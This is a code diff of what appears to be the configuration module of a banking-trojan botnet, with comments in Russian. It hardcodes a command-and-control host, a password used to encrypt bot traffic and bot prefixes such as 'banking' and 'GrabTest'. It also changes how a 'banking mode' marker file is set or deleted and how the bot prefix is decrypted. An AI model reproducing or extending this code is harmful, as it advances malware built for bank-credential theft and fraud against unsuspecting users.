@@ -57,12 +57,6 @@ namespace CONFIGDEBUGSTRINGS
 	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;
 
 	//----------------------------------------------------------------------------
-	// Префикс бота работающего в режиме Банк
-	//----------------------------------------------------------------------------
-	char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
-
-
-	//----------------------------------------------------------------------------
 	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
 	//----------------------------------------------------------------------------
 	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
@@ -83,10 +77,16 @@ namespace CONFIGDEBUGSTRINGS
 	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "rus.zika.in\0";
 
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
-	char DebugBotPrefix[] = "Bwwdxqiiatwvbvsss";
+	char BOT_PREFIX[]     = "GrabTest";
 	PCHAR DebugDelay      = "1";
 
 #endif
+
+
+//----------------------------------------------------------------------------
+// Префикс бота работающего в режиме Банк
+//----------------------------------------------------------------------------
+char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};
 
 
 #define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
@@ -157,11 +157,16 @@ string GetBankingModeFileName()
 }
 //-----------------------------------------------------------------------------
 
-void SetBankingMode()
+void SetBankingMode(bool IsBanking)
 {
 	string FileName = GetBankingModeFileName();
 	if (!FileName.IsEmpty())
-		File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
+	{
+		if (IsBanking)
+			File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
+		else
+			pDeleteFileA(FileName.t_str());
+	}
 }
 //-----------------------------------------------------------------------------
 
@@ -180,15 +185,15 @@ char *GetPrefix()
 {
 	// Функция возвращает префикс бота
 
-	#ifdef DEBUGCONFIG
-		return DebugBotPrefix;
-	#else
 		// Проверяем режим режим работы
-		if (IsBankingMode())
-			return BOT_PREFIX_BANK;
+//	if (IsBankingMode())
+//		return BOT_PREFIX_BANK;
 
-		return  Decrypt(BOT_PREFIX);
-	#endif
+	if (BOTPARAM_ENCRYPTED_PREFIX)
+		return Decrypt(BOT_PREFIX);
+	else
+		return BOT_PREFIX;
+
 }
 
 
@@ -525,7 +530,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 
 	#ifdef DEBUGCONFIG
 		switch (ParamID) {
-			case BOT_PARAM_PREFIX: Value = DebugBotPrefix;  break;
+			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
 			case BOT_PARAM_HOSTS:  Value = BOT_HOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:    Value = DebugPassword; break;
 			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
